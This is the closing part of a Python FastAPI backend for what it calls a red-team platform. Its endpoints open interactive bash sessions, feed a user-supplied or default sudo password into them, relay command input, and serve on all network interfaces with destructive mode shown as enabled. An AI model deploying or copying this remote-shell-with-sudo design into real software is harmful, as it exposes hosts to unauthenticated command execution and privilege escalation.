    requires_password = sudo_detected and not bool(provided_sudo_password or DEFAULT_SUDO_PASSWORD)
    return {
        "tool_name": tool_name,
        "command": effective_command,
        "success": bool(result.get("success")),
        "returncode": int(result.get("returncode", -1)),
        "stdout": str(result.get("stdout", ""))[:6000],
        "stderr": stderr[:4000],
        "cached": bool(result.get("cached")),
        "requires_sudo_password": requires_password,
        "command_requires_sudo": requires_sudo or sudo_detected,
        "sudo_password_source": "user" if provided_sudo_password else ("default" if requires_sudo and DEFAULT_SUDO_PASSWORD else None),
    }

@app.post("/api/tools/interactive/open")
def open_interactive_tool_session(payload: InteractiveToolSessionOpenRequest) -> dict[str, Any]:
    if pty is None:
        raise HTTPException(status_code=501, detail="Interactive console hanya tersedia di environment Linux container.")
    tool_name = str(payload.tool_name or "").strip().lower()
    command = validate_tool_command_request(tool_name, payload.command)
    if not is_interactive_tool(tool_name, command):
        raise HTTPException(status_code=400, detail="Tool ini tidak membutuhkan live console interaktif.")

    provided_sudo_password = str(payload.sudo_password or "").strip()
    requires_sudo = command_requires_sudo_password(command)
    sudo_password = provided_sudo_password or (DEFAULT_SUDO_PASSWORD if requires_sudo else "")
    should_run_with_sudo = bool(sudo_password and requires_sudo)
    effective_command = wrap_command_with_sudo_password(command) if should_run_with_sudo else command

    master_fd, slave_fd = pty.openpty()
    env = os.environ.copy()
    env["TERM"] = env.get("TERM", "xterm-256color")
    process = subprocess.Popen(
        ["/bin/bash", "-lc", effective_command],
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        cwd=str(BASE_DIR),
        env=env,
        start_new_session=True,
    )
    os.close(slave_fd)

    session_id = str(uuid.uuid4())
    session = {
        "id": session_id,
        "tool_name": tool_name,
        "command": command,
        "started_command": effective_command,
        "created_at": now_iso(),
        "updated_at": now_iso(),
        "status": "running",
        "exit_code": None,
        "output": "",
        "process": process,
        "master_fd": master_fd,
    }
    with INTERACTIVE_SESSION_LOCK:
        INTERACTIVE_SESSIONS[session_id] = session

    if should_run_with_sudo:
        try:
            os.write(master_fd, f"{sudo_password}\n".encode("utf-8", "replace"))
        except OSError:
            pass

    reader = threading.Thread(target=interactive_session_reader, args=(session_id,), daemon=True)
    session["reader"] = reader
    reader.start()
    time.sleep(0.35)
    with INTERACTIVE_SESSION_LOCK:
        live_session = INTERACTIVE_SESSIONS.get(session_id, session)
    return {"session": serialize_interactive_session(live_session)}

@app.get("/api/tools/interactive/{session_id}")
def get_interactive_tool_session(session_id: str) -> dict[str, Any]:
    with INTERACTIVE_SESSION_LOCK:
        session = INTERACTIVE_SESSIONS.get(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Interactive session not found")
        return {"session": serialize_interactive_session(session)}

@app.post("/api/tools/interactive/{session_id}/input")
def send_interactive_tool_input(session_id: str, payload: InteractiveToolSessionInputRequest) -> dict[str, Any]:
    command = str(payload.command or "")
    if not command.strip():
        raise HTTPException(status_code=400, detail="Command interaktif tidak boleh kosong.")
    with INTERACTIVE_SESSION_LOCK:
        session = INTERACTIVE_SESSIONS.get(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Interactive session not found")
        if session.get("status") != "running":
            raise HTTPException(status_code=400, detail="Interactive session sudah berhenti.")
        master_fd = session.get("master_fd")
    if master_fd is None:
        raise HTTPException(status_code=400, detail="Interactive session tidak lagi menerima input.")
    try:
        os.write(master_fd, (command if command.endswith("\n") else f"{command}\n").encode("utf-8", "replace"))
    except OSError as error:
        raise HTTPException(status_code=500, detail=f"Gagal mengirim input ke interactive session: {error}") from error
    time.sleep(0.2)
    with INTERACTIVE_SESSION_LOCK:
        session = INTERACTIVE_SESSIONS.get(session_id)
        if not session:
            raise HTTPException(status_code=404, detail="Interactive session not found")
        return {"session": serialize_interactive_session(session)}

@app.post("/api/tools/interactive/{session_id}/close")
def close_interactive_tool_session(session_id: str) -> dict[str, Any]:
    session = close_interactive_session_internal(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Interactive session not found")
    return {"session": session}

# ============ Main Entry ============
if __name__ == "__main__":
    import uvicorn
    print("="*70)
    print("🔥 RED TEAM PLATFORM - ALL MODULES LIVE")
    print("="*70)
    print(f"📁 Base: {BASE_DIR}")
    print(f"⚙️  Execution: {EXECUTION_MODE} 🔥 LIVE")
    print(f"⚠️  Destructive: {DESTRUCTIVE_MODE} ✅ FULL")
    print(f"📦  Live Modules: {len(LIVE_ADAPTERS)}")
    print(f"⏱️  Heartbeat: {JOB_HEARTBEAT_TIMEOUT_SECONDS}s")
    print(f"⏱️  Command: {COMMAND_TIMEOUT_SECONDS}s")
    print(f"🌐 Subnets: {', '.join(str(s) for s in ALLOWED_SUBNETS)}")
    print("="*70)
    uvicorn.run(app, host="0.0.0.0", port=8000)
